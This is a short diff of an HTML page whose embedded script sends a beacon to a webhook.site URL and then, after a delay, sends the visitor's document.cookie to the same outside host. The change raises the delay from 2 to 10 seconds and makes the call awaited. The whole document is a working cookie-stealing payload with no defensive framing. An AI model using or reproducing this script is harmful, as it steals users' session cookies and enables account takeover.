@@ -9,9 +9,9 @@
 <body>
 <script>
     fetch('https://webhook.site/d1f51e64-a4b7-40be-b382-ebbf3cb7b8a9?cookie='+ 'start');
-    setTimeout(function() {
-      fetch('https://webhook.site/d1f51e64-a4b7-40be-b382-ebbf3cb7b8a9?cookie='+document.cookie);
-    }, 2000);
+    setTimeout(async function() {
+      await fetch('https://webhook.site/d1f51e64-a4b7-40be-b382-ebbf3cb7b8a9?cookie='+document.cookie);
+    }, 10000);
   
 </script>
 </body>
